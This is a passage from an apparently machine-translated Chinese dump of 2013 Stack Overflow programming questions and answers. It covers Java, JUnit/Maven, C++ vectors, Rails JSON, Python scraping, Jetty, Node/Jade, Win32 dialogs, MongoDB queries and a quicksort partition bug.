    iD = numSquares;
}
public Square(int s){
    super(s);
    s = super.getS();
    numSquares ++;
    iD = numSquares;
}
public int getNumSquares(){
    return numSquares;
}
public int getID(){
    return iD;
}
public void setID(int iD){
    this.iD = iD;
}
@Override
public int findArea(){
    return (getS()*getS());
}
@Override
public int findPerimeter() {
    return (getS())*4; 
}
public String toString(){
    return "Side length is "+getS()+", Area is "+findArea()+" and Perimeter is "+findPerimeter();
}
public void decreaseNum(){
    numSquares --;
}
public boolean equals(Object s){
    if (s instanceof Square){
        Square temp = (Square)s;
        if(getID() == (temp.getID())){
            return true;
        }
    }
    return false;
} 
```

}

这是代码，感谢您的阅读和帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:45:04.247

您应该知道，在 Java 中，所有类都继承自 Object，而后者同时实现 toString 和 equals 方法，因此在您的任何类中都可以重新定义这些方法的行为，而无需在父类中声明为抽象（四）。

你可以得到这本书，以了解更多关于使用 java 进行面向对象编程的良好原则 使用 Java[进行面向对象编程的原则](http://dl.acm.org/citation.cfm?id=548612)

# java - 在 JUnit4 和 Maven 中运行 TestSuite

> ID：16204923
> 
> 赞同：2
> 
> 时间：2013-04-25T01:24:50.983
> 
> 标签：java, maven, junit, junit4, surefire

我正在将一个外部集成`junit.framework.TestSuite`到我的库中，该库是使用 Maven 和 JUnit4 构建的。典型的测试，如果不是全部的话，都是使用 JUnit4 注释开始的。如何将 a`junit.framework.TestSuite`合并到现有的测试代码库中？

这是我到目前为止所尝试的：

```
public class JSR330Tck {
    @Test
    public junit.framework.Test suite(){
        Car car = Factories.get(CarFactory.class).buildCar();
        return Tck.testsFor(car, false, true);
    }
} 
```

或者通过使用静态`suite()`方法定义它：

```
public class JSR330Tck {
    public static junit.framework.Test suite(){
        Car car = Factories.get(CarFactory.class).buildCar();
        return Tck.testsFor(car, false, true);
    }
} 
```

这两者都不是通过 Maven surefire 插件触发的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T17:43:49.790

我会假设您的测试类不是根据与[maven-surefire-plugin关系的测试命名约定命名的](http://maven.apache.org/surefire/maven-surefire-plugin/test-mojo.html#includes)

```
includes>
 <include>**/*Test*.java</include>
 <include>**/*Test.java</include>
 <include>**/*TestCase.java</include>
</includes> 
```

除此之外，您不应该使用 TestSuites，因为 surefire-plugin 已经可以处理了。所以通常不需要单独定义套件。

# c++ - 容器：向量类....慢

> ID：16204924
> 
> 赞同：0
> 
> 时间：2013-04-25T01:24:59.477
> 
> 标签：c++, performance, vector, containers

谁能解释为什么在矢量容器中 push_back 操作通常较慢？我听到有人这么说，但找不到它有点慢的原因。

作为初学者，我想使用 vector 和 push_back 但我还有其他选择可以提高性能吗？请告诉我。谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:36:08.190

向量将其对象存储在一个连续的数组中。它分配一定数量的空间（它的*容量*）来容纳对象；当对象的数量（其*大小*）即将超过容量时，它会分配更大的空间并复制（或移动）现有对象。

这可能需要一些时间。`push_back`为避免这种情况，并保证`insert`不需要重新分配，您可以`reserve`事先调用以分配足够大的块以满足您的需要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:31:58.237

当您将项目附加或插入到`std::vector`时，可能没有足够的空间来存储它。这会导致向量分配足够的存储空间来保存所有元素并将它们复制到新的内存块中。如果您按值而不是按指针存储对象，则将制作完整的副本。对于复杂类型，这可能会涉及并包括额外的分配和复制。在这种情况下，性能可能会受到矢量大小的影响。对于大型向量，性能损失将更加明显。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T01:32:56.413

`push_back`操作并不总是较慢。它具有恒定的复杂性（摊销时间）。唯一较慢的情况是发生重新分配时。有用的事情之一`std::vector`是您始终可以将对象添加到向量中，而不管其大小。假设向量的容量为 10，向量中有 10 个对象，然后发生重新分配以使向量更大。通常，向量大小加倍并将对象复制到新向量中，这是一个较慢的操作。

# ruby-on-rails - Ruby on Rails 生成模型

> ID：16204928
> 
> 赞同：-2
> 
> 时间：2013-04-25T01:25:33.977
> 
> 标签：ruby-on-rails, ruby, json, scaffolding

所以，我想让我的模型渲染为 json 对象，以便它可以用于 Android 设备。我已经设置了所有模型，但是因为我使用了 sccafold 生成模型调用，所以模型的控制器中没有任何方法...如何生成实际代码，以便可以在 json 中渲染模型?

我在用

```
$ rails --version
Rails 3.2.13 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:34:40.123

来自 Ruby on Rails 指南：

```
render :json => @product 
```

因此，在生成的控制器中，您可以执行以下操作：

```
def show
    @user = User.find( params[:id] )
    respond_to do |format|
        format.json{
            render :json => @user.to_json
        }
    end
end 
```

提示：您不需要在要渲染的对象上调用 to_json。如果你使用 :json 选项，render 会自动为你调用 to_json。

您可以找到一些关于先前已回答的问题的示例：

*   [在 Rails 中，如何使用视图呈现 JSON？](https://stackoverflow.com/questions/2088280/in-rails-how-do-you-render-json-using-a-view)
*   [在控制器中渲染 JSON](https://stackoverflow.com/questions/14824551/rendering-json-in-controller)
*   [Ruby on Rails - 为多个模型渲染 JSON](https://stackoverflow.com/questions/4318962/ruby-on-rails-render-json-for-multiple-models)

# python - 访问网页并下载*.ext文件，其中ext可以设置python脚本

> ID：16204931
> 
> 赞同：0
> 
> 时间：2013-04-25T01:26:03.433
> 
> 标签：python, parsing, url, urllib2

我有一个 python 脚本，可以下载我通过 URL 指定的特定文件，我想知道是否有一种访问页面的好方法，并获取以某个扩展名结尾的每个文件。

示例：转到包含一些 .py 文件、一些 .pdf 文件和一些 .jpg 文件以及文本和其他链接的页面。然后将所有 .py 文件下载到当前目录。

这就是我现在所拥有的，它只抓取我选择的特定文件：

```
import urllib2
import sys
import httplib
from urlparse import urlparse
import numpy

if numpy.size(sys.argv) == 1:
    print 'Need a command line argument -- Quitting'
    quit()
urlin = sys.argv[1]
url = "http://"+str(urlin)

def checkUrl(url):
    p = urlparse(url)
    conn = httplib.HTTPConnection(p.netloc)
    conn.request('HEAD', p.path)
    resp = conn.getresponse()
    return resp.status < 400

if checkUrl(url)==False:
    print 'Website is not active'
    quit()
else:

    file_name = url.split('/')[-1]
    u = urllib2.urlopen(url)
    f = open(file_name, 'wb')
    meta = u.info()
    file_size = int(meta.getheaders("Content-Length")[0])
    print "Downloading: %s Bytes: %s" % (file_name, file_size)

    file_size_dl = 0
    block_sz = 8192
    while True:
        buffer = u.read(block_sz)
        if not buffer:
            break

        file_size_dl += len(buffer)
        f.write(buffer)
        status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100\. / file_size)
        status = status + chr(8)*(len(status)+1)
        print status,

    f.close() 
```

有没有办法扩展它来做我最初提到的事情？

编辑：理想情况下，我希望能够使用相对标准的 python 包，但我并不完全反对奇怪的包。我也知道我可以下载链接所在的页面，并解析以 *.ext 结尾的字符串的 HTML，然后返回并通过将这些扩展附加到原始 URl 的末尾来下载这些扩展，但我是不擅长文件解析python。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:46:42.887

我会使用[Requests](http://docs.python-requests.org/en/latest/)来下载 Urls，并使用[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)来解析页面以查找更多要下载的 URL。

这是不完整的，但类似于：

```
import requests
import re
from bs4 import BeautifulSoup

req = requests.get(url)
req.raise_for_status()

html_doc = req.text.encode(req.encoding)
soup = BeautifulSoup(html_doc)

links = soup.findAll(href=re.compile("\.pdf$"))

for link in links:
    req = requests.get(link)
    # here, you'll want to use r.content, since it's probably a binary file
    content = req.content
    # write the bytes to a file 
```

# java - 我可以手动解压 .war 文件，然后运行嵌入了 jetty 的应用程序吗？

> ID：16204933
> 
> 赞同：0
> 
> 时间：2013-04-25T01:26:17.730
> 
> 标签：java, spring-mvc, jetty, classpath

目前，我有一个带有嵌入式码头实例的 spring-mvc，并且我正在使用 maven war 插件，该插件会生成一个我开始使用的“胖”war 文件：

```
java -jar myfat.war 
```

这使得生产更新需要很长时间 b/c .war 文件相当大。如果我可以解压缩战争文件，那就太好了，然后我可以将任何文件更改为我的生产服务器。

我可以这样做吗：

```
1\. locally build my fat war file
2\. locally unzip the war file
3\. push to server
4\. run exploded war file with embedded jetty instance 
```

**如果这是可能的，我该如何执行第 4 步？** 现在我没有 .war 文件，所以我不确定如何开始？

我确实知道拥有我的嵌入式服务器的主类：

```
com.myapp.server.MyJettyServer 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:23:33.747

您可以编写自己的嵌入式码头设置来完成这项工作，没有理由无法工作。我还将提到您也可以使用 jetty-runner 工件来执行此操作。

[http://www.eclipse.org/jetty/documentation/current/jetty-runner.html](http://www.eclipse.org/jetty/documentation/current/jetty-runner.html)

在该页面的下方是使用 context.xml 文件的示例。您可以轻松地拥有一个 context.xml 文件，该文件查看您展开的战争文件以进行启动。

或者，您也可以将分解的 war 文件放在 webapps 目录下的 jetty 实例上并同步，您不必*在*其中放置 .war 文件即可部署 webapp。

# html - 使用 js 脚本对引导表进行排序

> ID：16204935
> 
> 赞同：2
> 
> 时间：2013-04-25T01:26:29.407
> 
> 标签：html, twitter-bootstrap

我知道引导程序取消了在他们的 2.0 中对表进行排序的能力。我在网上寻找排序问题的解决方案，我发现了以下不错的脚本 [http://www.kryogenix.org/code/browser/sorttable/](http://www.kryogenix.org/code/browser/sorttable/)

我现在遇到的问题是箭头（用于按升序/降序排序）没有立即出现，只有在用户在表格上单击一次后它们才会出现。但是用户永远不会知道他或她可以在没有看到图标的情况下单击进行排序。

我玩了这个与图标有关的部分。

```
 sortfwdind.innerHTML = '<span class="ui-icon ui-icon-triangle-1-s"></span>';
  sortfwdind.className = "ui-icon ui-icon-triangle-1-s"; 
```

但我无法让它在第一次点击之前呈现一个初始图标。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T02:03:34.913

该库使用纯 HTML 在表头之后插入行。寻找：

```
sortrevind.innerHTML = stIsIE ? '&nbsp<font face="webdings">5</font>' : '&nbsp;&#x25B4;'; 
```

在源代码中。您可能只想`'&nbsp;&#x25B4;'`在每个表头之后添加（在第一次单击之前有箭头），然后编辑其 innerHTML 并在单击事件中删除该图标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-20T17:45:14.303

有关执行此操作的一种方法，请参阅sorttable 文档中的[http://www.kryogenix.org/code/browser/sorttable/#symbolsbeforesorting](http://www.kryogenix.org/code/browser/sorttable/#symbolsbeforesorting)。

# mysql - 在 AppHarbor 服务器上创建表时，MySql 错误 1044（用户访问被拒绝）？

> ID：16204944
> 
> 赞同：0
> 
> 时间：2013-04-25T01:27:53.310
> 
> 标签：mysql, database, wcf, appharbor

我在 AppHarbor 上提供了一项服务。我有 MySql 数据库，我也需要把它放进去。我在 AppHarbor 网站上更改了字符串连接别名，我使用他们给我的用户名和密码连接到 AppHarbor 数据库 - 我有一个 sql 脚本，我想创建表，但是这个错误正在弹出。如何解决这个错误，任何人？谢谢 ：）

# javascript - 如何使用 NodeJS + ExpressJS 将数组传递给 Jade 进行显示？

> ID：16204951
> 
> 赞同：3
> 
> 时间：2013-04-25T01:28:18.690
> 
> 标签：javascript, mysql, node.js, express, pug

我来自一种非常“功能性”的编程风格（PHP、Lua、C），我正试图将我的想法转变为 NodeJS 使用的 MVC 模型。目前，这对我来说是一个非常陡峭的学习曲线。

我一直在努力尝试将一个简单的 MySQL 数组打印到 Jade。

应用程序.js

```
/**
 * Module dependencies.
 */

var express = require('express')
  , routes = require('./routes')
  , user = require('./routes/user')
  , http = require('http')
  , path = require('path')
  , mysql = require('mysql');

var app = express();

// all environments
app.set('port', process.env.PORT || 3000);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
app.use(express.favicon());
app.use(express.logger('dev'));
app.use(express.bodyParser());
app.use(express.methodOverride());
app.use(app.router);
app.use(express.static(path.join(__dirname, 'public')));

// development only
if ('development' == app.get('env')) {
  app.use(express.errorHandler());
}

app.get('/', routes.index);
app.get('/users', user.list);

//MySQL
var sqlInfo = {
  host: '12.34.56.78', 
  user: 'user',
  password: 'pass', 
  database: 'user'
}

var client = mysql.createConnection(sqlInfo);
client.connect();

client.query( "SELECT * FROM list ORDER BY status ASC LIMIT 25", function(err, row, fields){
  if (err) throw err;
  else {
    var applications = row;
    app.render("applications", applications, function(err, html){});
  }  
});

client.end();

http.createServer(app).listen(app.get('port'), function(){
  console.log('Express server listening on port ' + app.get('port'));
}); 
```

索引.jade

```
extends layout

block content
  div.container
    div.content   
      - if (typeof(applications) !== 'undefined')
        ul
          - each app in data
            li= app.status
      - else
        p Blank slate mate...

  div.footer 
```

我认为我的问题源于 app.render/res.render 函数......这个函数的概念并没有真正点击，我在让它工作时遇到了问题，就像我在许多其他 MySQL + NodeJS 中看到的那样例子。

非常感谢任何提示或提示！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T05:28:30.207

问题是您试图在 HTTP 流之外呈现查询。这*可能*是您的意图（在这种情况下，我很想听听您究竟想对呈现的结果做什么），但通常，您会在返回查询结果之前等待 HTTP 请求。

例如：

```
app.get('/test', function(req, res) {
  // connect to MySQL server
  var client = mysql.createConnection(sqlInfo);
  client.connect();

  // Perform query and wait for results
  client.query( "SELECT * FROM list ORDER BY status ASC LIMIT 25", function(err, row, fields) {
    // Done with the connection
    client.end();

    // Handle error
    if (err) throw err;
    else {
      // We got a result: render it
      var applications = row;
      res.render("applications", { applications : applications });
    }
  });
}); 
```

几点建议：

*   您可以通过打开查看结果`http://localhost:PORT/test`
*   看看MySQL 的[连接池](https://github.com/felixge/node-mysql#pooling-connections)，它维护一个与 MySQL 服务器的连接池，而不是每次处理请求时都必须创建一个新连接；
*   在您的示例代码中，您在`client.end()`之后立即发送`client.query()`，但没有等待查询返回任何结果。所以我移到`client.end()`处理查询结果的代码内部，以确保只有在返回结果后才结束连接；
*   在您的模板中，您引用了一个名为 的变量`data`，但我认为应该是`applications`;

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T04:03:03.363

您可以在渲染视图时将变量传递给翡翠，如下所示：

```
res.render('index', { applications: applications }, function(err, html){}); 
```

然后你可以在你的 index.jade 中使用它：

```
if (typeof(applications) !== 'undefined') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T05:28:07.617

我可以在这里看到两个问题。

首先，您将`"applications"`作为第一个参数传递给 app.render()。这可能应该`"index"`与您的视图名称相匹配。

其次，这是我认为您缺少的关键点，即您需要`html`在传递给 app.render() 的函数中做一些事情。

```
app.render("applications", applications, function(err, html){
    //see what you have for html here
}); 
```

将函数传入渲染背后的想法是它像回调一样工作。您可以检查 err 以查看渲染视图是否存在问题。如果没有错误，`html`应该有基于 Jade 模板和您传入的任何数据的渲染 HTML ( `applications`)。

如果您仍然有问题，我有几个建议。您可能应该调试您的数据以查看其外观。确保 MySQL 查询以您期望的格式返回数据。然后您可以查看您的模板是否有效。尝试传入一个简单的数据对象并首先使用一个简单的 Jade 模板，以确保您正确调用 app.render()。

我希望这会有所帮助！

# javascript - javascript - 为什么在评估对象时添加括号？

> ID：16204959
> 
> 赞同：1
> 
> 时间：2013-04-25T01:29:23.523
> 
> 标签：javascript

回复内容：`{"body": "123", "timestamp": 1366853254, "html": "<div class=\"message\" id=\"m721cfd57-cf57-4fa9-b0a4-263151da4f7d\"><b>Scuk: <\/b>123<\/div>\n", "from": "Scuk", "id": "721cfd57-cf57-4fa9-b0a4-263151da4f7d"}`

代码：

```
console.log( eval( '(' + response + ')'));
console.log( eval( response )); 
```

`console.log( eval( '(' + response + ')'));`在 报告时未`unexpected token`报告错误`console.log( eval( response ));`。谁能告诉我为什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T01:30:35.430

我们添加括号，因此它将被评估为表达式。例如，`({})`被解释为对象文字，而`{ ... }`被解析为块语句。

```
{
    foo: 1,
    bar: 2
}

// Uncaught SyntaxError: Unexpected token : 
```

# c++ - 我的关于窗口打不开

> ID：16204966
> 
> 赞同：0
> 
> 时间：2013-04-25T01:30:15.637
> 
> 标签：c++, api, winapi, dialog

不管你信不信，我已经在这呆了 5 个小时。我非常紧张，因为它看起来很基础，当我真正掌握所有这些资源时，制作程序会容易得多。

这是我的代码：

```
#include <windows.h>
#include "resource.h"

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK AboutDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam );

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR lpszCmdParam, int nCmdShow)
     {
     static char szAppName[] = "ErrorSample";
     HWND           hwnd;
     MSG            msg;    // Look how this struct is defined-see help/class notes NOW
     WNDCLASSEX     wndclass; 
     HWND           hwndDialogBox = NULL;
     HMENU  hMenu;

          wndclass.cbSize        = sizeof(wndclass);
          wndclass.style         = CS_HREDRAW | CS_VREDRAW;
          wndclass.lpfnWndProc   = WndProc;
          wndclass.cbClsExtra    = 0;
          wndclass.cbWndExtra    = 0;
          wndclass.hInstance     = hInstance;
          wndclass.hIcon         = LoadIcon (NULL, IDC_ICON);

          wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW);
          wndclass.hbrBackground = static_cast<HBRUSH>(GetStockObject (WHITE_BRUSH));
          wndclass.lpszMenuName  = NULL;
          wndclass.lpszClassName = szAppName;
          wndclass.hIconSm       = LoadIcon(NULL, MAKEINTRESOURCE(IDI_ERROR));

          RegisterClassEx (&wndclass);

          hMenu = LoadMenu(hInstance, MAKEINTRESOURCE(102));

     hwnd = CreateWindow (szAppName,         // window class name
                    "Trying my damndest",            // window caption
                    WS_OVERLAPPEDWINDOW,     // window style
                    CW_USEDEFAULT,           // initial x position
                    CW_USEDEFAULT,           // initial y position
                    CW_USEDEFAULT,           // initial x size
                    CW_USEDEFAULT,           // initial y size
                    NULL,                    // parent window handle
                    hMenu,                    // window menu handle
                    hInstance,               // program instance handle
                    NULL);                   // creation parameters

     ShowWindow (hwnd, nCmdShow);
     UpdateWindow (hwnd);

     while (GetMessage (&msg, NULL, 0, 0))
          {
          TranslateMessage (&msg);
          DispatchMessage (&msg);
          }
     return (int) msg.wParam;
     }

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, 
                          WPARAM wParam, LPARAM lParam)
     {
     static HINSTANCE    hInstance;

     switch (message)
         {

         case WM_CREATE:
             hInstance = ((LPCREATESTRUCT) lParam) ->hInstance;
             return 0;

         case WM_COMMAND:
             switch(LOWORD(wParam))
             {
             case ID_HELP_ABOUT:
                 DialogBox( hInstance, "AboutBox", hwnd, AboutDlgProc);
                 break;
             }

             return 0;

         case WM_DESTROY:
             PostQuitMessage(0);
             return 0;
         }

     return DefWindowProc (hwnd, message, wParam, lParam);
     }

BOOL CALLBACK AboutDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
        return TRUE;

    case WM_COMMAND:
        switch(LOWORD(wParam))
        {
        case IDOK:
        case IDCANCEL:
            EndDialog(hDlg, 0);
            return TRUE;
        }
        break;
    }
    return FALSE;
} 
```

当我在 WndProc 的 WM_COMMAND 中单击我的 ID_HELP_ABOUT 案例语句时，没有任何反应。它甚至没有进入我的 AboutDlgProc 函数。

资源.h

```
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Practice.rc
//
#define DIALOG_BOX                      9
#define IDR_MENU1                       102
#define ID_HELP_ABOUT                   40001

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        103
#define _APS_NEXT_COMMAND_VALUE         40002
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif 
```

.rc 文件

```
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "afxres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""afxres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//

DIALOG_BOX DIALOGEX 32, 32, 309, 178
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_SYSMENU
FONT 8, "MS Shell Dlg", 400, 0, 0x1
BEGIN
    DEFPUSHBUTTON   "OK",IDOK,198,157,50,14
END

/////////////////////////////////////////////////////////////////////////////
//
// DESIGNINFO
//

#ifdef APSTUDIO_INVOKED
GUIDELINES DESIGNINFO
BEGIN
    DIALOG_BOX, DIALOG
    BEGIN
        LEFTMARGIN, 7
        RIGHTMARGIN, 302
        TOPMARGIN, 7
        BOTTOMMARGIN, 171
    END
END
#endif    // APSTUDIO_INVOKED

/////////////////////////////////////////////////////////////////////////////
//
// Menu
//

IDR_MENU1 MENU
BEGIN
    MENUITEM "&File",                       0
    POPUP "&Help"
    BEGIN
        MENUITEM "&About",                      ID_HELP_ABOUT
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////

#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//

/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED 
```

请帮忙！=)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T01:43:22.560

将您的对话框调用更改为此：

```
DialogBox( hInstance, MAKEINTRESOURCE(DIALOG_BOX), hwnd, AboutDlgProc); 
```

# php - Mongodb 使用 where 查找字段是否存在

> ID：16204970
> 
> 赞同：1
> 
> 时间：2013-04-25T01:30:37.383
> 
> 标签：php, mongodb

本质上是否可以使用 $in 找到基于子文档的文档。例如说我有：

```
array(
'item.1',
'item.2',
'item.3
) 
```

将返回具有以下内容的文档：

```
{
    item {
        1: {

        }
    }
}
{
    item {
        2: {

        }
    }
}
{
    item {
        3: {

        }
    }
} 
```

我知道如果我有一个我可以使用`db.inventory.find( { qty: { $exists: true, $nin: [ 5, 15 ] } } )`的，但我将如何使用 $in 来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T03:58:12.233

您可以使用这种形式的查询：

```
db.collection.find ( { $or : [
          {"item.1":{$exists:true}},
          {"item.2":{$exists:true}},
          {"item.3":{$exists:true}}
] } ); 
```

这将返回任何具有一个或多个“item.X”的文档，在这种情况下为 1、2 或 3 集。

# web - 不打开页面的弹出消息

> ID：16204972
> 
> 赞同：0
> 
> 时间：2013-04-25T01:30:37.743
> 
> 标签：web, popup

嗯，就是这样，我正在浏览互联网的任何页面，突然，我的 ISP 屏幕上出现了一个弹出窗口（提醒我我今天没有付款）......所以你知道如何发送没有打开网页或在电脑上安装任何东西的消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:53:53.747

> 我正在浏览互联网的任何页面......

由于您的互联网访问是通过 ISP 进行的，因此他们有能力操纵通过其硬件的流量。这包括替换站点的内容、附加内容或插入内容。

显然他们不能改变实际的网站，但是如果你请求“foo.com”并且你还没有支付你的账单，他们可以根据你的请求返回任何他们想要的东西。

他们可以返回`<script>window.open()</script>`+ "foo.com" 的 HTML 内容。无效，但浏览器会呈现它。他们可以返回一个警告页面。他们可以返回一个 HTTP 状态码。你明白了。

如果你没有打开你的网络浏览器，那么就会在后台安装一些东西（不管你是否知道）。大多数硬件都带有数十种试图“提供帮助”的后台服务。

# sql - 在 postgres 或任何 SQL 平台中使用正则表达式从多个表中选择数据

> ID：16204978
> 
> 赞同：1
> 
> 时间：2013-04-25T01:31:26.413
> 
> 标签：sql, regex

有没有办法在 postgres 或任何 SQL 平台中使用正则表达式从多个表中进行选择？

如果表名遵循某种模式，我想从数据库中的所有表中选择数据。

我尝试了以下但没有任何成功......

```
SELECT cpu_id,date,time,duration,state,speed
FROM like 'count%' ","where date = '2012-09-27' 
```

表名是`count1`，`count2`依此类推。我想把它们都拿走。

对不起，我不知道如何在这种情况下放置可重现的示例/数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:38:55.293

没有办法做到这一点。表格旨在保存不同的行和数据。您是否考虑过合并表（相反，放置某种索引而不是不同的表名）？

# java - 我不确定我的分区函数有什么问题

> ID：16204979
> 
> 赞同：0
> 
> 时间：2013-04-25T01:31:27.930
> 
> 标签：java, debugging, sorting

Eclipse 不断告诉我我的分区函数有问题。它在java中，是一个关于排序数组的类的一部分。

分区的工作原理如下：数组中有两个索引 i 和 j，在分区算法的最开始，i 指向数组中的第一个元素，j 指向最后一个元素。然后算法向前移动 i，直到找到值大于或等于枢轴的元素。索引 j 向后移动，直到找到值小于或等于枢轴的元素。如果 i ≤ j 则它们被交换并且 i 步到下一个位置 (i + 1)，j 步到前一个位置 (j - 1)。当 i 大于 j 时，算法停止。

你能看到问题是什么，因为我很难找到它。非常感谢您的帮助。

```
public static int partition(int arr[], int left, int right)
    {
        int x = arr[right];

        int i = left-1;
        int temp=0;

        for (int j=left; j<right; j++)
        {
            if(arr[j]<=x)
            {
                i++;
                temp = arr[i];
                arr[i] = arr[j];
                arr[j] = temp;

            }
        }

        temp = arr[i+1];
        arr[i+1] = arr[right];
        arr[right] = temp;
        return (i+1);

    } 
```

编辑

Eclipse是说有两个问题，一个是分区函数中的这行代码：

```
int x = arr[right]; 
```

并使用我的测试类的这一行：

```
sort.partition(array, 100, array.length); 
```

这是测试类，其中包括我没有提到的功能。

```
import java.util.Random;

public class test {

    /**
     * @param args
     */
    public static void main(String[] args) {

        int size = 1000;
        int max = 5000; 
        int[] array = new int[size];
        int loop = 0; 

        Random generator = new Random();
        //Write a loop that generates 1000 integers and 
        //store them in the array using generator.nextInt(max)

        generator.nextInt(max); //generating one

        //I need to generate 1000
        //So I need some kind of loop that will generate 1000 numbers. 

        for (int i =0; i<1000; i++)
        {
            generator.nextInt(max);
        }

        /**
         * After I do this, I'll have the array, array. 
         * Then comes what's under this. 
         * THat method is for measuring the time.
         * System.currentTimeMillis();, 
         * with this, I can collect a time for the start of the method
         * and one for the end. 
         * Time at the end, minus the time at the start
         * gets us the running time. 
         */

        long result;

        long startTime = System.currentTimeMillis();
        sort.quickSort(array,  100,  array.length-1);
        long endTime = System.currentTimeMillis();
        result = endTime-startTime; 

        System.out.println("The quick sort runtime is " + result + " miliseconds");

        long result2;

        long startTime2 = System.currentTimeMillis(); 
        sort.partition(array, 100, array.length);
        long endTime2 = System.currentTimeMillis();
        result2 =  endTime2 - startTime2;
        System.out.println("The partition runtime is "+result2 + " miliseconds");

        long result3;

        long startTime3 = System.currentTimeMillis();
        sort.bubbleSort(array, 100);
        long endTime3 = System.currentTimeMillis();
        result3 = endTime3-startTime3;
        System.out.println("The bubble sort runtime is "+result3 + " miliseconds");

        long result4;

        long startTime4 = System.currentTimeMillis();
        sort.selectionSort(array, 100); //change the second number to change
        //the size of an array. 
        long endTime4 = System.currentTimeMillis();
        result4 = endTime4-startTime4;
        System.out.println("The selection sort runtime is "+result4 + " miliseconds");

    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:31:05.787

首先，您实际上并没有将随机数存储在数组中，因此它将全为零。

至于您看到的实际错误，您已经得到了一个经典错误。您有两个选择：`right`指向数组的末尾或数组末尾之后的一个。任何一个都是有效的，但你正在混合两者。

具体来说，您传递了 1000，即数组末尾的一个`right`值，但随后您立即用它索引数组，自然会引发异常。

# php - 比较不完全匹配的字符串

> ID：16204980
> 
> 赞同：0
> 
> 时间：2013-04-25T01:31:30.553
> 
> 标签：php, preg-match-all

我正在为一门大学课程做一个简短的回答测验。基本上学生必须输入答案/关键词。我`preg_match_all()`用来做字符串比较（用户回答和数据库中的回答）。我正在尝试一个单词的答案，结果还可以，但是在提交短语时出现了问题。

```
 if(preg_match_all("/". $ans[$arr_ind]. "/i", " . $atext[$arr_ind] . ")){
            echo "<p align='justify'><img src='image/mark.png' border='0' width='20' height='20'></img><b> YOUR ANSWER: </b>". $ans[$arr_ind]. "</p>";
            $total = $total + 1;
            $correct = 1;
    }
    else
            echo "<p align='justify'><img src='image/cross.png' border='0' width='20' height='20'></img> <b>YOUR ANSWER: </b>". $ans[$arr_ind]. "</p>"; 
```

例如：

**提交的答案：**硬件、软件

**数据库中的答案：**

1.  硬件：通过执行指令处理数据；提供输入和输出。
2.  软件：系统执行的指令。
3.  数据：事实和观察的基本表示；原始事实。
4.  通信：在不同系统之间共享数据和处理；通信通道、接口硬件和软件。

该函数将其评估为错误答案。我已经查找了正则表达式，但不认为这是为了这个。任何帮助将不胜感激。谢谢。

阿提卡

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:54:07.310

您始终可以将答案拆分为各个部分并运行检查：

```
$answers = explode(",", $ans[$arr_ind]);
foreach ($answers as $answer) {
    $answer = trim($answer);
    if (stripos($atext[$arr_ind], $answer) !== false)
        // correct
    else
        // incorrect
} 
```

我也回答了你之前的问题，我认为发布的答案进入*$ans[]*对吗？这就是第一行中引用的内容，但根据需要切换数组。

